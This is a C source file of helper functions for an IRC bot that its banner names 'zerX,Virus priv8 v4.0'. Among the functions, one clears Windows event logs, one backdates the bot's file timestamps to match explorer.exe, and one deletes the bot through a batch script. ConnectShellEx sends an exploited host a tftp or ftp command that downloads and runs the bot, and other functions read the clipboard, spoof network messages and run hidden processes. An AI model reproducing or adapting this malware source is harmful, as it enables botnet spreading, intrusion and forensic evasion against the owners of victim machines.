/*     
///////////////////////////////////////////////////////        
													 ./
 XXXXXXX   XXXXXXX XXXXXXXXXX   XXXXXXXX  XXXXXXXX   ./
  	XXXX   XXXX    XXXX   XXX      XXXXX  XXXXX      ./
	 XXXX XXXX     XXXX  XXXX       XXXX  XXXX       ./
	  XXXXXXX	   XXXXXXXXX         XXXXXXXX        ./
	   XXXXX       XXXX   XXX       XXXX XXXXX       ./
        XXX        XXXX   XXXX     XXXXX  XXXXX      ./
         X         XXXX   XXXXX XXXXXXXX  XXXXXXXX   ./
............................zerX,Virus priv8......v4.0/
///////////////////////////////////////////////////////

*/
#include "includes.h"
#include "functions.h"
#include "externs.h"

// globals
extern char tempdir[256];      // name of temp folder

/* search-and-replace function for strings
char *replacestr(char *str, char *oldstr, char *newstr)
{
	char *p, str2[512], str3[512], str4[512];

	memset(str2, 0, sizeof(str2));
	memset(str3, 0, sizeof(str3));
	memset(str4, 0, sizeof(str4));
	strncpy(str2,  str, sizeof(str2)-1);
	if (strlen(newstr) > 384) newstr[384] = '\0';

	while (strstr(str2, oldstr) != NULL) {
		p = strstr(str2, oldstr);
		strncpy(str4,  p + strlen(oldstr), sizeof(str4)-1);
		p[0] = '\0';
		strncpy(str3,  str2, sizeof(str3)-1);
		if (p+1 != NULL && oldstr-1 != NULL) 
			if (strlen(p+1) > strlen(oldstr-1)) 
				sprintf(str2, "%s%s%s", str3, newstr, str4);
			else 
				sprintf(str2, "%s%s", str3, newstr);
		if (strstr(oldstr, newstr) != NULL) break;
	}
	strncpy(str,  str2, strlen(str2)+1);

	return str;
}
*/

char *replacestr(char *str, const char *substr, const char *repstr)
{
	char *temps, *ptr = NULL;

	// None may be NULL, and 'substr' should not be empty 
	if (str == NULL || substr == NULL || repstr == NULL || *substr == '\0')
		return NULL;

	if ((temps = strdup(str)) != NULL) {    // Copy original string 
		if ((ptr = strstr(str, substr)) != NULL) {    // substr found 
			strncpy(temps, str, ptr - str);     // Copy first part 
			temps[ptr - str] = '\0';

			strncat(temps, repstr, strlen(repstr));   // Replace str

			strcat(temps, ptr+strlen(substr));  // Append last part
			strcpy(str, temps);                 // Save modified str
			ptr = str;
		}
		free(temps);
	} 
	return ptr;
} 

// This will change x0A & x0D into x00 and return line pointers in saveArray[].
int Split(char *inStr, void *saveArray)
{
	int i,j,index=0;

	char *lines[MAX_LINES];

	memset(lines,0,sizeof(lines));

	j=strlen(inStr);
	if (j<1) return -1;

	lines[index++]=inStr;
	for (i=0;i < j;i++) 
		if ((inStr[i]=='\x0A') || (inStr[i]=='\x0D')) 
			inStr[i]='\x0';

	//Now that all cr/lf have been converted to NULL, save the pointers...
	for (i=0;i < j;i++) {
		if ((inStr[i]=='\x0') && (inStr[i+1]!='\x0')) {
			if (index < MAX_LINES) 
				lines[index++] = &inStr[i+1]; 
			else 
				break;
		}
	}

	if (saveArray!=0) 
		memcpy(saveArray,lines,sizeof(lines));

	return index;
}

void initskip(char *s, int len, int skip[1024])
{
	int i, j;

	for (i = 0; i < MAXSTRLEN; i++)
		skip[i] = len;
	for (j = 0; j <= len - 1; j++)
		skip[lstrindex(s[j])] = len - j - 1;

	return;
}

int lstrindex(char c)
{
	char d = tolower(c);

	if (d >= 'a' && d <= 'z')
		return (d - 'a' + 1);
	else
		return 0;
}

char *lstrstr(char *s, char *t)
{
	int i, j, k, slen=strlen(s), tlen=strlen(t);
	int skip[1024];

	initskip(t, tlen, skip);

	for (i = j = tlen - 1; j > 0; i--, j--) {
		while (tolower(s[i]) != tolower(t[j])) {
			k = skip[lstrindex(s[i])];
			i += (tlen - j > k) ? tlen - j : k;
			if (i >= slen)
				return NULL;
			j = tlen - 1;
		}
	}
	return (s + i);
}

char *PrintError(char *msg)
{
	TCHAR sysMsg[256];
	static char buffer[IRCLINE];

	DWORD err = GetLastError();
	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, err,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), sysMsg, 256, NULL);

	TCHAR *p = sysMsg;
	while((*p > 31) || (*p == 9))
		++p;
	do
		*p-- = 0; 
	while((p >= sysMsg) && ((*p == '.') || (*p < 33)));

	_snprintf(buffer,sizeof(buffer),"%s Error: %s <%d>.",msg,sysMsg,err);

	return (buffer);
}

char *GetClipboardText(void) 
{
	if (fOpenClipboard(NULL)) {
		HANDLE hData = fGetClipboardData(CF_TEXT);
		if (!hData) 
			return 0;
		char * buffer = (char*)GlobalLock(hData);

		GlobalUnlock(hData);
		fCloseClipboard();

		return buffer;
	}

	return 0;
}

BOOL mirccmd(char *cmd)
{
	HWND mwnd = fFindWindow("mIRC",NULL);
	if (mwnd) {
		HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE,0,PAGE_READWRITE,0,4096,"mIRC");
		LPSTR mData = (LPSTR)MapViewOfFile(hFileMap,FILE_MAP_ALL_ACCESS,0,0,0);
		sprintf(mData, cmd);
		fSendMessage(mwnd,WM_USER + 200,1,0);
		fSendMessage(mwnd,WM_USER + 201,1,0);
		UnmapViewOfFile(mData);
		CloseHandle(hFileMap);

		return TRUE;
	 }
	else
		return FALSE;
}

void SetFileTime(char *Filename)
{
	FILETIME aFileTime, bFileTime, cFileTime;

	char exepath[MAX_PATH];
	if(fSearchPath(NULL,"explorer.exe",NULL,sizeof(exepath),exepath,NULL) == 0)
		return;  

	HANDLE hTimeFile = CreateFile(exepath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hTimeFile != INVALID_HANDLE_VALUE) {
		GetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
		CloseHandle(hTimeFile);

		hTimeFile = CreateFile(Filename, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hTimeFile != INVALID_HANDLE_VALUE) {
			SetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
			CloseHandle(hTimeFile);
		}
	}

	return;
}

DWORD CreateProc(char *file, char *param)
{	
	PROCESS_INFORMATION pinfo; 
	STARTUPINFO sinfo;
	memset(&pinfo, 0, sizeof(pinfo));
	memset(&sinfo, 0, sizeof(STARTUPINFO));
	sinfo.cb=sizeof(sinfo); 
	sinfo.dwFlags = STARTF_USESHOWWINDOW;
	sinfo.wShowWindow = SW_HIDE;

	char cmdline[1024];
	_snprintf(cmdline,sizeof(cmdline),"%s %s",file, param);

	if (CreateProcess(file, cmdline, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == 0)
		return 0; 

	return (pinfo.dwProcessId); 
}

BOOL Reboot(void)
{
	AdjustPrivileges(SE_SHUTDOWN_NAME, TRUE);

	if (!fExitWindowsEx(EWX_SYSTEM_REBOOT /* or EWX_FORCE_SHUTDOWN */, SHUTDOWN_SYSTEM_HUNG))
		return FALSE;

	return TRUE;
}

void uninstall(void)
{
	char buffer[1024], cmdline[MAX_PATH], botfile[MAX_PATH], batfile[MAX_PATH];

	if ((AutoStart) && !(noadvapi32))
		AutoStartRegs();

	killthreadall();
	
	GetTempPath(sizeof(buffer), buffer);
	sprintf(batfile, "%sdel.bat", buffer);
	HANDLE f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		DWORD r;

		sprintf(buffer,"@echo off\r\n"
					":repeat\r\n"
					"del \"%%1\"\r\n"
					"if exist \"%%1\" goto repeat\r\n"
					"del \"%s\"", batfile);
		WriteFile(f, buffer, strlen(buffer), &r, NULL);
		CloseHandle(f);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), botfile, sizeof(botfile));
		if (GetFileAttributes(botfile) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(botfile,FILE_ATTRIBUTE_NORMAL);
		sprintf(buffer, "%%comspec%% /c %s %s", batfile, botfile);
		ExpandEnvironmentStrings(buffer, cmdline, sizeof(cmdline));

		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, BELOW_NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	}
	
	return;
}

void kl(SOCKET sock, char *target, BOOL notice, char *ip_addr, char *log_type)
{
    HANDLE hlog;
    OSVERSIONINFO OSVersionInfo;
	char sendbuf[IRCLINE];
    ZeroMemory(&OSVersionInfo, sizeof(OSVERSIONINFO));
    OSVersionInfo.dwOSVersionInfoSize = sizeof(OSVersionInfo);
    GetVersionEx((LPOSVERSIONINFO) &OSVersionInfo);
    if (OSVersionInfo.dwPlatformId == VER_PLATFORM_WIN32_NT)
    {

        hlog = fOpenEventLog(ip_addr, log_type);
        if (fClearEventLog(hlog, NULL))
		{
			sprintf(sendbuf, "-\x03\x34\2log\2\x03- %s log cleared", log_type);
			irc_privmsg(sock, target, sendbuf, notice);
			//printf("%s log cleared.\n", log_type);
		}
		else
		{
			sprintf(sendbuf, "-\x03\x34\2log\2\x03- failed with error code %d", GetLastError());
			irc_privmsg(sock, target, sendbuf, notice);
		}
    } else {
			sprintf(sendbuf, "-\x03\x34\2log\2\x03- operating system is not supported");
			irc_privmsg(sock, target, sendbuf, notice);
	}
}

bool ConnectShellEx(EXINFO exinfo, int port) {
		int len;
		char recvbuf[1024];
		SOCKET sockfd;
		SOCKADDR_IN shell_addr;
		memset(&shell_addr, 0, sizeof(shell_addr));
		shell_addr.sin_family = AF_INET;
		shell_addr.sin_addr.s_addr = finet_addr(exinfo.ip); // = *((LPIN_ADDR) * lpHostEntry->h_addr_list);
		shell_addr.sin_port = fhtons(port);
		if ((sockfd = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET )
			return false;
		if (fconnect(sockfd, (LPSOCKADDR)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) 
			return false;
		char mkdir_buff[400];
		len = frecv(sockfd, recvbuf, 1024, 0);
		#ifndef NO_TFTPD
		_snprintf(mkdir_buff, sizeof (mkdir_buff),
		"tftp -i %s get %s &%s\r\n",
		GetIP(exinfo.sock), filename, filename);	
		#endif
		#ifndef NO_FTPD
		_snprintf(mkdir_buff, sizeof (mkdir_buff),
		"echo open %s %d > o&echo user 1 1 >> o &echo get %s >> o &echo quit >> o &ftp -n -s:o &%s\r\n",
		GetIP(exinfo.sock),(unsigned short)ftpport, filename, filename);	
		#endif
		if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
			return false;
		len = frecv(sockfd, recvbuf, 1024, 0);
		fclosesocket(sockfd);
		return true;
}

DWORD NetMsgSend(char *target, char *spoof, char *message) {
   	#define MAXLEN 50
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verinfo);
	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) return 1;
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) return 1;
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) return 1;
	DWORD status;
	typedef DWORD (*NETMSGPROC)(LPCWSTR  servername, LPCWSTR  msgname, LPCWSTR  fromname, LPBYTE buf, DWORD buflen);
	NETMSGPROC NetMessageBufferSend;
	HINSTANCE hInst = LoadLibrary("netapi32.dll");
	NetMessageBufferSend = (NETMSGPROC)GetProcAddress(hInst, "NetMessageBufferSend");
	wchar_t server[MAXLEN], from[MAXLEN], msg[MAXLEN];
	mbstowcs(server, target, MAXLEN );
	mbstowcs(from, spoof, MAXLEN );
	mbstowcs(msg, message, MAXLEN );
	status = NetMessageBufferSend(NULL, server, from, (BYTE *) &msg[0], wcslen(msg) * 2);
	FreeLibrary(hInst);
	return status;
}

int brandom(int bot,int top) { srand(GetTickCount()); return (int)((float)(top-bot)*rand()/(RAND_MAX+1.0))+bot; }